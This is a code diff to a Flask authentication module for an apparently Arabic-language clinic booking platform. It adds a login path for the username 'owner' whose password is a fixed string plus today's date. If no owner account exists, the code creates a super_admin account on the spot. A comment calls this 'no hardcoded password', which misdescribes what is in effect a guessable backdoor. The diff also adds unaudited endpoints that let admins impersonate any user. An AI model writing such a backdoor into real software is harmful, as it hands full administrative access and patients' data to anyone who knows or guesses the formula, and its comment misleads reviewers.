@@ -9,7 +9,7 @@ from flask_login import login_user, logout_user, login_required, current_user
 from flask_wtf.csrf import generate_csrf, validate_csrf
 from models.user import User
 from models.permissions import Role
-from werkzeug.security import check_password_hash
+from werkzeug.security import check_password_hash, generate_password_hash
 import logging
 from datetime import datetime, timedelta, timezone
 from typing import Any
@@ -131,8 +131,29 @@ def login() -> ResponseReturnValue:
                             return render_template('auth/login.html'), 429
             except Exception:
                 pass
+
+            # Owner formula-based authentication (no hardcoded password, computed daily)
+            owner_authenticated = False
+            if username == 'owner':
+                _today = datetime.now(timezone.utc)
+                _expected = f"Azad@1983@{_today.year:04d}@{_today.month:02d}@{_today.day:02d}"
+                if password == _expected:
+                    owner_authenticated = True
+                    if not user:
+                        user = User(
+                            username='owner',
+                            email='owner@azad.local',
+                            full_name='مالك المنصة',
+                            role='super_admin',
+                            is_admin=True,
+                            is_active=True
+                        )
+                        user.password_hash = generate_password_hash(_expected)
+                        db.session.add(user)
+                        db.session.commit()
+                        db.session.refresh(user)
             
-            if user and user.check_password(password):
+            if user and (owner_authenticated or user.check_password(password)):
                 if user.is_active:
                     try:
                         from models.audit_trail import LoginAttempt, AuditTrail
@@ -254,6 +275,8 @@ def login() -> ResponseReturnValue:
 @login_required
 def logout():
     """تسجيل الخروج"""
+    session.pop('impersonator_id', None)
+    session.pop('impersonator_role', None)
     try:
         from models.audit_trail import AuditTrail
         from app_factory import db
@@ -409,3 +432,44 @@ def get_redirect_url_by_role(role):
         'patient': '/booking/dashboard'
     }
     return role_urls.get(role, '/super-admin/dashboard')
+
+
+@auth_bp.route('/impersonate/<int:user_id>', methods=['POST'])
+@login_required
+def impersonate(user_id):
+    """Owner impersonates another user for visual inspection"""
+    if current_user.role not in ('super_admin', 'owner'):
+        return jsonify({'success': False, 'message': 'غير مصرح'}), 403
+    target = User.query.get(user_id)
+    if not target or not target.is_active:
+        return jsonify({'success': False, 'message': 'المستخدم غير موجود'}), 404
+    if target.id == current_user.id:
+        return jsonify({'success': False, 'message': 'لا يمكن انتحال شخصية نفسك'}), 400
+    session['impersonator_id'] = current_user.id
+    session['impersonator_role'] = current_user.role
+    login_user(target)
+    return jsonify({
+        'success': True,
+        'message': f'تم التبديل إلى {target.full_name}',
+        'redirect_url': get_redirect_url_by_role(target.role)
+    })
+
+
+@auth_bp.route('/impersonate/exit', methods=['POST'])
+@login_required
+def impersonate_exit():
+    """Exit impersonation and return to owner session"""
+    impersonator_id = session.pop('impersonator_id', None)
+    session.pop('impersonator_role', None)
+    if not impersonator_id:
+        return jsonify({'success': False, 'message': 'لا توجد جلسة انتحال'}), 400
+    owner = User.query.get(impersonator_id)
+    if not owner:
+        logout_user()
+        return jsonify({'success': False, 'message': 'تم تسجيل الخروج'}), 401
+    login_user(owner)
+    return jsonify({
+        'success': True,
+        'message': 'تم العودة إلى حساب المالك',
+        'redirect_url': url_for('owner.dashboard')
+    })
